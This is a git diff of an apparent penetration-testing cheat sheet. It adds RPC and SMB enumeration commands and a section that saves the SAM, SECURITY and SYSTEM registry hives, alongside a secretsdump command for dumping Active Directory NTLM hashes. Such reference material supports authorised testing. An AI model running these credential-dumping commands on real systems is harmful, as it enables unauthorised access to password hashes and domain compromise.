@@ -199,18 +199,30 @@ Command: SharpHound.exe -c all -d <domain> --zipfilename loop.zip
 ```
 ## RPC
 
-#### Enumeration
+### Tools
 
-Enumerate rpc
+- impacket-rpcdump
+- impacket-lookupsid
+
+### Enumeration
+
+#### Enumerate rpc
 
 ```
 Command: impacket-rpcdump <domain/ip>
 ```
 
-Check if is vulnerable to printnightmare
+#### Check if is vulnerable to printnightmare
 
 ```
 Command: impacket-rpcdump <domain/ip> | egrep 'MS-RPRN|MS-PAR'
+```
+
+#### Enumerate users, groups by sid
+
+if you have permissions to read IPC$
+```
+Command : impacket-lookupsid -no-pass anonymous@<ip>
 ```
 
 ## SMB
@@ -218,23 +230,35 @@ Command: impacket-rpcdump <domain/ip> | egrep 'MS-RPRN|MS-PAR'
 ### Tools
 
 - smbclient
+- smbmap
 
-#### Enumeration
+### Enumeration
 
-*Enumerate shares*
-
+#### Enumerate shares
 ```
 Command : smbclient -U <user> -L \\\\<ip/domain>\\
 ```
 
-*Access to share*
+#### Enumerate permissions
+ ```
+ smbmap -H <ip/domain> -u <user> -p <password>
+ ```
 
+#### Access to share
 ```
 Command : smbclient -U <user> \\\\<ip/domain>\\<share>
 ```
 
-#### Dump AD password hashes
+## SAM and LSA
 
+### Dump SAM and LSA
+```
+Command : reg save HKLM\SAM "C:\Windows\Temp\sam.save"
+Command : reg save HKLM\SECURITY "C:\Windows\Temp\security.save"
+Command : reg save HKLM\SYSTEM "C:\Windows\Temp\system.save"
+```
+
+#### Dump AD password hashes
 ```
 Command : python3 secretsdump.py -just-dc-ntlm <domain>/<user>@<ip/domain>
 ```
